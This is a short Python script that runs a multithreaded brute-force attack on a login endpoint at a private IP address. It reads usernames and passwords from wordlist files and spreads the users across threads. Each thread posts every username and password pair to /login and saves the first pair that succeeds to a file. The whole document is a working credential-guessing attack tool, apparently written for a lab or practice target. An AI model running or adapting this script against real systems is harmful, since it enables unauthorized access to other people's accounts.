import requests
import json
import threading
import _thread


def paritioner(list_to_split, chunk_size):
    list_of_chunks =[]
    start_chunk = 0
    end_chunk = start_chunk+chunk_size
    while end_chunk <= len(list_to_split)+chunk_size:
        chunk_ls = list_to_split[start_chunk: end_chunk]
        list_of_chunks.append(chunk_ls)
        start_chunk = start_chunk +chunk_size
        end_chunk = end_chunk+chunk_size    
    return list_of_chunks

url = "http://192.168.80.106/"
username = []
password = []

partitions = {}
num_thread = 20
with open("users.txt") as f:
	username = f.read().splitlines()
with open("passwd") as f:
	password = f.read().splitlines()

partitions = paritioner(username,20)






print(password)

def run_request(partition):
	username = partition
	for user in username:
		for passwd in password:
			response = requests.post('http://192.168.80.106/login',json={"username":user,"password":passwd})
		
			if "unauthorized" in response.content.decode("utf-8").lower():
				print("not this...")

			else:
				print("username is:",user)
				print("passwd is:",passwd)
				f = open("test.txt","w")
				f.write("username is:" + user + "\n")
				f.write("passwd is:" + passwd + "\n")
				f.close()
				exit()


for partition in partitions:
	threading.Thread(target = run_request, args = (partition,)).start()




